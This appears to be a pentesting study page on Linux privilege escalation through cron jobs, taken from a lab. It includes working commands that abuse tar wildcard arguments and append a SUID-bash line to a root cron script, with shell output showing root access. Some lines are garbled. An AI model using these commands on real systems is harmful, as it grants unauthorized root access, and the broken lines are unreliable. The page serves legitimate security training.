---
description: echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash'
---

# ⌛ Cron & Timers

### Introduction

Cron is a time-based job scheduler in Unix-like operating systems. It allows users to schedule jobs (commands or shell scripts) to run periodically at fixed times, dates, or intervals. When misconfigured, Cron can be exploited for privilege escalation.

<figure><img src="https://contabo.com/blog/wp-content/uploads/2023/05/blog-head_syntax-of-cron.jpg" alt=""><figcaption></figcaption></figure>

### Identifying Cron Jobs

#### View User's Cron Jobs

To view the Cron jobs for the current user, use the following command:

```bash
crontab -l
```

or

```
TCM@debian:~$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow usercommand
17 ** * *root    cd / && run-parts --report /etc/cron.hourly
25 6* * *roottest -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6* * 7roottest -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 61 * *roottest -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
* * * * * root overwrite.sh
* * * * * root /usr/local/bin/compress.sh
```

#### View System-Wide Cron Jobs

System-wide Cron jobs are often stored in directories like `/etc/cron.d/` or `/etc/cron.daily/`. Examine these directories to identify scheduled tasks.

```bash
ls /etc/cron.d/
ls /etc/cron.daily/
```

You can also look at this documentation ([https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)) and ctrl+F to cron

<figure><img src="../../../../../.gitbook/assets/image (291).png" alt=""><figcaption></figcaption></figure>

### Exploiting Misconfigurations

### Cron Wildcards <a href="#lecture_heading" id="lecture_heading"></a>

In a cron expression, the asterisk (`*`) is used as a wildcard character to represent "every" or "any" possible value for the corresponding time unit. The cron syntax consists of five fields that represent minutes, hours, days of the month, months, and days of the week. Here's the basic structure of a cron expression:

```
* * * * *
| | | | |
| | | | +----- Day of the week (0 - 6) (Sunday to Saturday)
| | | +------- Month (1 - 12)
| | +--------- Day of the month (1 - 31)
| +----------- Hour (0 - 23)
+------------- Minute (0 - 59)
```

Using the asterisk (\*) as a wildcard in any of these fields means "every possible value." For example:

* `*` in the "Minute" field would mean "every minute."
* `0 * * * *` means "every hour at the 0th minute."
* `*/15 * * * *` means "every 15 minutes."

So, the asterisk is a powerful wildcard character in cron expressions, allowing you to specify recurring patterns for scheduled tasks.

Let's try:

remember, one of our crons is:&#x20;

```
TCM@debian:~$ cat /usr/local/bin/compress.sh 
#!/bin/sh
cd /home/user
tar czf /tmp/backup.tar.gz *
```

So let's try to take advantage of that wildcard

```
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash > runme.sh
chmod +x runme.sh
```

```
TCM@debian:~$ touch /home/user/--checkpoint=1
TCM@debian:~$ touch /home/user/--checkpoint-action=exec=sh\runme.sh
TCM@debian:~$ /tmp/bash-p
bash:~$ whoami
 root
```

The provided command `tar czf /tmp/backup.tar.gz *` creates a compressed archive (`tar.gz`) of all files (`*`) in the current directory and its subdirectories.

So in our case, it runs:

```
tar czf /tmp/backup.tar.gz --checkpoint=1 --checkpoint-action=exec=sh\runme.sh
```

And thanks to runme.sh we gain a root shell

### Cron File Overwrites <a href="#lecture_heading" id="lecture_heading"></a>

```
TCM@debian:~$ echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >> /usr/local/bin/overwrite.sh
 
TCM@debian:~$ cat /usr/local/bin/overwrite.sh 
#!/bin/bash

echo `date` > /tmp/useless
cp /bin/bash /tmp/bash; chmod +s /tmp/bash
TCM@debian:~$ ls -al /tmp
total 196
drwxrwxrwt  2 root root   4096 Jan 10 07:59 .
drwxr-xr-x 22 root root   4096 Jun 17  2020 ..
-rw-r--r--  1 root root 181517 Jan 10 07:59 backup.tar.gz
-rw-r--r--  1 root root     29 Jan 10 07:59 useless
TCM@debian:~$ /tmp/bash -p
bash-4.1# whoami
root
```

#### Explanation:

This privilege escalation involves creating a script that overwrites the `/bin/bash` binary with a copy that has the SUID bit set, allowing any user to execute it with the permissions of the file owner (root). Let's break down the provided commands:

1.  **Create an Overwrite Script:**

    ```bash
    echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >> /usr/local/bin/overwrite.sh
    ```

    * This command appends a line to the file `/usr/local/bin/overwrite.sh`.
    * The appended line copies the `/bin/bash` binary to `/tmp/bash` and sets the SUID bit on the copied binary.
2.  **Content of `overwrite.sh`:**

    ```bash
    #!/bin/bash

    echo `date` > /tmp/useless
    cp /bin/bash /tmp/bash; chmod +s /tmp/bash
    ```

    * The script `/usr/local/bin/overwrite.sh` contains a shebang (`#!/bin/bash`) and two commands.
    * It writes the current date to the file `/tmp/useless`.
    * It copies `/bin/bash` to `/tmp/bash` and sets the SUID bit on `/tmp/bash`.
3.  **List `/tmp` Directory:**

    ```bash
    ls -al /tmp
    ```

    * This command lists the contents of the `/tmp` directory.
    * The output shows the `useless` file and the `backup.tar.gz` file, along with the recently created `/tmp/bash` binary.
4.  **Execute `/tmp/bash -p`:**

    ```bash
    /tmp/bash -p
    ```

    * This command runs the `/tmp/bash` binary with the `-p` option, which preserves the current effective user ID (EUID).
    * The effective user ID is set to root, and when `whoami` is executed within this shell, it returns `root`, indicating successful privilege escalation.

In summary, the attacker created a script that overwrites `/bin/bash` with a copy that has the SUID bit set. When this modified binary is executed, it runs with elevated privileges, allowing the attacker to obtain a root shell.

#### Overwriting Cron Jobs

If you have write access to a user's Cron jobs, you can overwrite them with malicious commands. Use an editor to open the user's crontab:

```bash
crontab -e
```

#### Cron Jobs as Root

Check if any Cron jobs are running with elevated privileges. Look for entries that execute commands with `sudo` or as another user.

```bash
sudo crontab -l
```

### Abusing Timers

#### Crontab Syntax

Understanding the crontab syntax is crucial. The format is:

```
* * * * * command_to_be_executed
```

* Minute (0 - 59)
* Hour (0 - 23)
* Day of month (1 - 31)
* Month (1 - 12)
* Day of week (0 - 6) (Sunday to Saturday)

#### Creating a Cron Job

You can create a new Cron job using the `crontab` command. For example, to run a script every day at 2 AM:

```bash
0 2 * * * /path/to/myscript.sh
```

#### Malicious Cron Jobs

An attacker may add a malicious Cron job to maintain persistence or execute unauthorized actions.

#### Checking for Write Permissions

Check if you can write to directories where Cron jobs are stored. Overwriting existing jobs or adding new ones may lead to privilege escalation.
